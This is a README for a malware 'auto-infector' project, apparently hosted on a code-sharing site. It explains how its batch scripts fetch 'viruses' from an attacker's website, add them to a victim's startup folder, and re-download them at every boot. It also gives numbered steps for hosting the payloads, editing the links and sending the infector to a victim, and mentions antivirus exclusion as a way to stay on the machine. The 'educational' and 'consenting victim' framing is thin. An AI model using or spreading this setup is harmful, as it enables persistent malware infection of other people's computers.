# auto-infector
This is an auto infector designed for educational purposes, aimed at pentesters and social engineers. The script runs on the victim's PC and downloads all the viruses from a designated folder or file link, then launches them at startup (by adding them to shell:startup). The script runs automatically at startup and re-downloads viruses to update them or add new ones. If the victim (who of course has given you the permission to do that) adds the "pro_cracker" folder to their antivirus exclusions, they will remain infected indefinitely.
 
How to use:
1. Edit the updater.bat'2nd line with the folder that contains all the viruses you want (they will automatically be downloaded and added to startup)  
2. Upload the updater.bat to your website (it should be accessible from the victim's computer)  
3. Edit the infector.bat's 3rd line with your infector.bat link  
4. Send the infector to the victim

(Not sponsored but you can host your viruses that you send to the consenting vitcim on [https://www.infinityfree.net/], you have 5GB free storage and a free subdomain)
